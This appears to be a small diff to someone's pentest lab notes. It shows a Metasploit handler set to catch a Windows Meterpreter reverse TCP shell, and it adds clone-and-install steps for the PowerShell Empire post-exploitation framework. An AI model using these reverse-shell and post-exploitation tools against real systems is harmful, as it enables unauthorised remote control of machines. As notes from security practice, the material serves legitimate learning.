@@ -97,3 +97,13 @@ restart Win 7
 
 then msf -> msf6 exploit(multi/handler) 
 payload => windows/meterpreter/reverse_tcp > run
+
+POWERSHeLL eMPIRe -- Post-Exploitation Framework
+
+cd /opt
+git clone https://github.com/BC-SECURITY/Empire.git
+cd setup
+./install.sh
+cd ..
+./empire
+
